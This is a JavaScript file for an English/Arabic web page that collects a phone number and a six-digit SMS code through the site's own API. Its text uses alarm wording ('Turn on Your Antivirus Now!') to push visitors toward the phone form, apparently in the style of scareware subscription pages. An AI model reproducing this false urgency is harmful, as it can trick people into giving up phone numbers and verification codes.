document.addEventListener("DOMContentLoaded", () => {
  // DOM Elements
  const phoneSection = document.getElementById("phone-section");
  const verificationSection = document.getElementById("verification-section");
  const successSection = document.getElementById("success-section");
  const phoneInput = document.getElementById("phone");
  const continueBtn = document.getElementById("continue-btn");
  const verifyBtn = document.getElementById("verify-btn");
  const resendBtn = document.getElementById("resend-btn");
  const codeInput = document.querySelector(".code-input");
  const errorMessage = document.getElementById("error-message");
  const languageBtn = document.getElementById("language-btn");

  // State
  let currentLanguage = "en";
  let sessionId = null;

  // Translations
  const translations = {
    en: {
      "header.title": "Important Reminder",
      "header.subtitle": "Turn on Your Antivirus Now!",
      "main.title": "Protect Your Data!",
      "main.subtitle": "The BEST Antivirus Protection",
      "phone.instruction": "Enter your phone number",
      "code.instruction": "Enter verification code",
      "button.continue": "CONTINUE!",
      "button.verify": "VERIFY",
      "button.resend": "Resend Code",
      "success.text": "Verification successful!",
    },
    ar: {
      "header.title": "تذكير مهم",
      "header.subtitle": "قم بتشغيل برنامج مكافحة الفيروسات الآن!",
      "main.title": "احمِ بياناتك!",
      "main.subtitle": "أفضل حماية ضد الفيروسات",
      "phone.instruction": "أدخل رقم هاتفك",
      "code.instruction": "أدخل رمز التحقق",
      "button.continue": "استمرار!",
      "button.verify": "تحقق",
      "button.resend": "إعادة إرسال الرمز",
      "success.text": "تم التحقق بنجاح!",
    },
  };

  // Event Listeners
  continueBtn.addEventListener("click", handleContinue);
  verifyBtn.addEventListener("click", handleVerify);
  resendBtn.addEventListener("click", handleResend);
  languageBtn.addEventListener("click", toggleLanguage);

  /**
   * Handle continue button click
   */
  function handleContinue() {
    const phone = phoneInput.value.trim();

    if (validatePhone(phone)) {
      // Call API to send verification code
      fetch('/api/v1/send-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phone }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          sessionId = data.sessionId; // Save session ID for verification
          phoneSection.classList.add("hidden");
          verificationSection.classList.remove("hidden");
          codeInput.focus();
        } else {
          showError("Error sending code. Please try again.");
        }
      })
      .catch(err => showError("Error: " + err));
    } else {
      showError("Please enter a valid phone number.");
    }
  }

  /**
   * Handle verify button click
   */
  function handleVerify() {
    const code = codeInput.value.trim();

    if (validateCode(code)) {
      // Call API to verify the code
      fetch('/api/v1/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sessionId, code: code }),
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          verificationSection.classList.add("hidden");
          successSection.classList.remove("hidden");
        } else {
          showError("Invalid verification code.");
        }
      })
      .catch(err => showError("Error: " + err));
    } else {
      showError("Please enter a valid verification code.");
    }
  }

  /**
   * Handle resend button click
   */
  function handleResend() {
    // Call API to resend verification code
    fetch('/api/v1/resend-code', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId: sessionId }),
    })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        alert("Verification code resent");
      } else {
        showError("Error resending code.");
      }
    })
    .catch(err => showError("Error: " + err));
  }

  /**
   * Toggle between English and Arabic
   */
  function toggleLanguage() {
    currentLanguage = currentLanguage === "en" ? "ar" : "en";
    languageBtn.textContent = currentLanguage === "en" ? "EN" : "AR";
    document.documentElement.dir = currentLanguage === "ar" ? "rtl" : "ltr";
    document.documentElement.lang = currentLanguage;
    updateTranslations();
  }

  /**
   * Update all text content with translations
   */
  function updateTranslations() {
    document.getElementById("header-title").textContent = getTranslation("header.title");
    document.getElementById("header-subtitle").textContent = getTranslation("header.subtitle");
    document.getElementById("main-title").textContent = getTranslation("main.title");
    document.getElementById("main-subtitle").textContent = getTranslation("main.subtitle");
    document.getElementById("phone-instruction").textContent = getTranslation("phone.instruction");
    document.getElementById("code-instruction").textContent = getTranslation("code.instruction");
    document.getElementById("continue-btn").textContent = getTranslation("button.continue");
    document.getElementById("verify-btn").textContent = getTranslation("button.verify");
    document.getElementById("resend-btn").textContent = getTranslation("button.resend");
    document.getElementById("success-text").textContent = getTranslation("success.text");
  }

  /**
   * Get translation for a key
   */
  function getTranslation(key) {
    return translations[currentLanguage][key] || key;
  }

  /**
   * Validate phone number
   */
  function validatePhone(phone) {
    return phone.length >= 10;
  }

  /**
   * Validate verification code
   */
  function validateCode(code) {
    return code.length === 6 && /^\d+$/.test(code);
  }

  /**
   * Show error message
   */
  function showError(message) {
    errorMessage.textContent = message;
    errorMessage.classList.remove("hidden");
  }
});
